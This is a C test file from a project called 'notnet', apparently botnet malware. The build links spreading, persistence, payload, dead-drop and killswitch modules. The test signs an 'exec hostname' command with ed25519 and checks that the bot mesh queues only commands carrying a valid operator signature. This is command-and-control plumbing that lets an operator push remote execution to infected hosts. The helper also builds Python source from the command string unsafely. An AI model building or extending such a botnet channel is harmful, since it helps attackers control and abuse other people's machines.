/*
 * notnet — host test for the P2P mesh command-signer (#139).
 *
 * Single-process, CI-safe: generates an ed25519 keypair with OpenSSL (via a
 * small python3 helper for hex conversion, no xxd dependency), signs a
 * command, and feeds it through mesh_verify_and_queue() to prove the trust
 * gate (good sig accepted + queued, bad sig refused, wrong-command sig
 * refused, fail-closed when no operator pubkey is configured).
 *
 * Build (needs libssl for the signing/verify path):
 *   make MESH_ED25519=1
 *   gcc -DTLS_ENABLED -DMESH_ED25519 -I include tests/host/mesh_test.c \
 *       src/mesh.o src/util.o src/protocol.o src/persist.o src/spread.o \
 *       src/payload.o src/proxy.o src/deaddrop.o src/relay.o src/plugin.o \
 *       src/killswitch.o -lssl -lcrypto -lpthread -o /tmp/mesh_test
 *   /tmp/mesh_test
 *
 * Research purposes only.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "protocol.h"
#include "mesh.h"

/* Generate an ed25519 keypair and sign `cmd`.
 * Writes the 64-hex pubkey into pub_hex and the 128-hex signature into sig_hex.
 * Uses openssl for crypto + python3 for hex (avoids xxd dependency). */
static int openssl_sign(const char *cmd, char *pub_hex, char *sig_hex) {
    const char *py =
        "import subprocess,os,sys\n"
        "f='/tmp/mesh_t_kx'\n"
        "open(f+'.cmd','w').write('%s')\n"
        "subprocess.run(['openssl','genpkey','-algorithm','ed25519','-out',f+'.pem'],"
        "check=True,stderr=subprocess.DEVNULL)\n"
        "der=subprocess.run(['openssl','pkey','-in',f+'.pem','-pubout','-outform','DER'],"
        "check=True,capture_output=True).stdout\n"
        "pub=der[-32:]\n"
        "subprocess.run(['openssl','pkeyutl','-sign','-inkey',f+'.pem','-rawin',"
        "'-in',f+'.cmd','-out',f+'.sig'],check=True,stderr=subprocess.DEVNULL)\n"
        "sigb=open(f+'.sig','rb').read()\n"
        "open(f+'.out','w').write(pub.hex()+' '+sigb.hex())\n"
        "os.unlink(f+'.cmd'); os.unlink(f+'.sig'); os.unlink(f+'.pem')\n";
    FILE *sf = fopen("/tmp/mesh_t_kx.py", "w");
    if (!sf) return -1;
    /* substitute cmd into the python via a format write */
    char pybuf[2048];
    snprintf(pybuf, sizeof(pybuf), py, cmd);
    fputs(pybuf, sf);
    fclose(sf);
    if (system("python3 /tmp/mesh_t_kx.py") != 0) return -1;
    FILE *of = fopen("/tmp/mesh_t_kx.out", "r");
    if (!of) return -1;
    char buf[256] = {0};
    if (!fgets(buf, sizeof(buf), of)) { fclose(of); return -1; }
    fclose(of);
    char *sp = strchr(buf, ' ');
    if (!sp) return -1;
    *sp = '\0';
    strncpy(pub_hex, buf, 64); pub_hex[64] = '\0';
    strncpy(sig_hex, sp + 1, 128); sig_hex[128] = '\0';
    unlink("/tmp/mesh_t_kx.py"); unlink("/tmp/mesh_t_kx.out");
    if (strlen(pub_hex) != 64 || strlen(sig_hex) != 128) return -1;
    return 0;
}

int main(void) {
    char pub[65] = {0}, sig[129] = {0};
    if (openssl_sign("exec hostname", pub, sig) != 0) {
        printf("mesh_test: openssl/python3 keypair+sign setup FAILED (need openssl + python3)\n");
        return 2;
    }
    printf("mesh_test: generated ed25519 keypair, sig len=%zu\n", strlen(sig));

    notnet_bot_t *bot = calloc(1, sizeof(*bot));
    strncpy(bot->relay_token, "fleet-token", sizeof(bot->relay_token) - 1);
    strncpy(bot->mesh_operator_pubkey, pub, sizeof(bot->mesh_operator_pubkey) - 1);
    bot->mesh_port = 11082;

    if (mesh_start(bot) != 0) { printf("mesh_start FAILED\n"); return 1; }

    /* Good signature: must be accepted + queued. */
    int rc = mesh_verify_and_queue(bot, "exec hostname", sig);
    if (rc != 0 || bot->cmd_count != 1 ||
        strcmp(bot->cmd_queue[0], "exec hostname") != 0) {
        printf("mesh_test: GOOD signature REJECTED (rc=%d cmd_count=%d) — FAIL\n", rc, bot->cmd_count);
        mesh_stop(); free(bot); return 1;
    }
    printf("mesh_test: good signature accepted + queued (cmd_count=%d)\n", bot->cmd_count);

    /* Bad signature (flip first hex char): must be refused. */
    char bad[129]; snprintf(bad, sizeof(bad), "%s", sig);
    bad[0] = (bad[0] == '0') ? '1' : '0';
    int rc2 = mesh_verify_and_queue(bot, "exec hostname", bad);
    if (rc2 == 0) {
        printf("mesh_test: BAD signature ACCEPTED — FAIL\n");
        mesh_stop(); free(bot); return 1;
    }
    printf("mesh_test: bad signature refused (cmd_count unchanged=%d)\n", bot->cmd_count);

    /* Signature was over "exec hostname" — a different command must be refused. */
    int rc3 = mesh_verify_and_queue(bot, "exec uname -a", sig);
    if (rc3 == 0) {
        printf("mesh_test: signature over different command ACCEPTED — FAIL\n");
        mesh_stop(); free(bot); return 1;
    }
    printf("mesh_test: command-mismatch refused (correct)\n");

    mesh_stop();
    free(bot);
    printf("MESH TRUST GATE: PASS\n");
    return 0;
}
